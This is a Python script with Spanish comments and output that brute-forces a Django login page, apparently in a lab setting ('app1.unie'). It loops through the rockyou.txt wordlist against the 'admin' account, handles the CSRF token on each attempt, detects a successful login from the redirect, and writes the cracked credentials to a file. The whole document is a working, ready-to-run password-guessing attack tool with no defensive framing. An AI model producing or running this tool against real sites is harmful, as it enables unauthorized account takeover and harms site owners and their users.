#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time

def brute_force_django_admin(password_file="rockyou.txt", target_url="http://app1.unie/admin/login/"):

    # Realiza fuerza bruta contra el panel de administración de Django
    try:
        # Leer el archivo de contraseñas
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        
        print(f"[*] Cargadas {len(passwords)} contraseñas desde {password_file}")
        print(f"[*] Objetivo: {target_url}")
        print(f"[*] Usuario probado: admin")
        print("-" * 50)
        
        success = False
        tested = 0
        
        for password in passwords:
            tested += 1
            
            # Mostrar progreso cada 100 intentos
            if tested % 100 == 0:
                print(f"[*] Progreso: {tested}/{len(passwords)} intentos")
            
            # Crear nueva sesión para cada intento (importante para CSRF)
            session = requests.Session()
            
            try:
                # 1. Obtener página de login y token CSRF
                print(f"[{tested}] Probando: '{password}'", end="", flush=True)
                
                response = session.get(target_url, timeout=10)
                
                if response.status_code != 200:
                    print(f" -> Error HTTP {response.status_code}")
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
                
                if not csrf_input:
                    print(" -> No se encontró token CSRF")
                    continue
                
                csrf_token = csrf_input['value']
                
                # 2. Intentar login
                login_data = {
                    'csrfmiddlewaretoken': csrf_token,
                    'username': 'admin',
                    'password': password,
                    'next': '/admin/'
                }
                
                headers = {
                    'Referer': target_url,
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
                
                response = session.post(
                    target_url, 
                    data=login_data, 
                    headers=headers, 
                    allow_redirects=False,
                    timeout=10
                )
                
                # 3. Verificar resultado
                if response.status_code == 302:
                    location = response.headers.get('Location', '')
                    if '/admin/' in location and 'login' not in location:
                        print(f" -> ¡ÉXITO! Contraseña encontrada: {password}")
                        print("-" * 50)
                        print("[+] ==============================================")
                        print(f"[+] CREDENCIALES ENCONTRADAS: admin:{password}")
                        print("[+] ==============================================")
                        
                        # Guardar resultado en archivo
                        with open("credenciales_encontradas.txt", "w") as f:
                            f.write(f"URL: {target_url}\n")
                            f.write(f"Usuario: admin\n")
                            f.write(f"Contraseña: {password}\n")
                        
                        success = True
                        break
                    else:
                        print(" -> Falló (redirección a login)")
                else:
                    # Buscar mensajes de error comunes
                    if "Please enter the correct" in response.text:
                        print(" -> Incorrecta")
                    elif "CSRF" in response.text:
                        print(" -> Error CSRF")
                    else:
                        print(f" -> Código HTTP: {response.status_code}")
                
                # Pequeña pausa para evitar bloqueos
                time.sleep(0.1)
                
            except requests.exceptions.Timeout:
                print(f" -> Timeout")
                time.sleep(1)
            except requests.exceptions.ConnectionError:
                print(f" -> Error de conexión")
                time.sleep(2)
            except Exception as e:
                print(f" -> Error: {str(e)[:30]}")
        
        if not success:
            print("\n[-] No se encontró la contraseña en el diccionario")
            
    except FileNotFoundError:
        print(f"[!] Error: No se encontró el archivo {password_file}")
        print("[!] Puedes descargar rockyou.txt desde:")
        print("[!] https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
        print("[!] O crear uno manual: echo 'admin' > passwords.txt")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")

def main():
    print("____             _         _____                  \n| __ ) _ __ _   _| |_ ___  |  ___|__  _ __ ___ ___ \n|  _ \\| '__| | | | __/ _ \\ | |_ / _ \\| '__/ __/ _ \\\n| |_) | |  | |_| | ||  __/ |  _| (_) | | | (_|  __/\n|____/|_|   \\__,_|\\__\\___| |_|  \\___/|_|  \\___\\___|")
    print(" ___           ___ ___ ___ ___ \n| __|__ _ _   / __/ __| _ \\ __|\n| _/ _ \\ '_| | (__\\__ \\   / _| \n|_|\\___/_|    \\___|___/_|_\\_|  \n                               \n")
    # Configuración
    password_file = "rockyou.txt"  # Cambia si está en otra ruta
    target_url = "http://app1.unie/users/login/"
    #target_url = "http://app1.unie/admin/login/"
    
    # Verificar si el archivo existe
    import os
    if not os.path.exists(password_file):
        print(f"[!] Archivo {password_file} no encontrado")
        
    
    print("[*] Iniciando ataque de fuerza bruta...")
    print("[*] Presiona Ctrl+C para detener")
    print("")
    
    # Iniciar ataque
    brute_force_django_admin(password_file, target_url)
    
    print("\n[*] Ejecución completada")

if __name__ == "__main__":
    # Instalar dependencias si es necesario
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        print("[!] Instalando dependencias necesarias...")
        import subprocess
        subprocess.check_call(["pip", "install", "requests", "beautifulsoup4"])
        print("[*] Dependencias instaladas, ejecuta de nuevo el script")
        exit()
    
    main()

    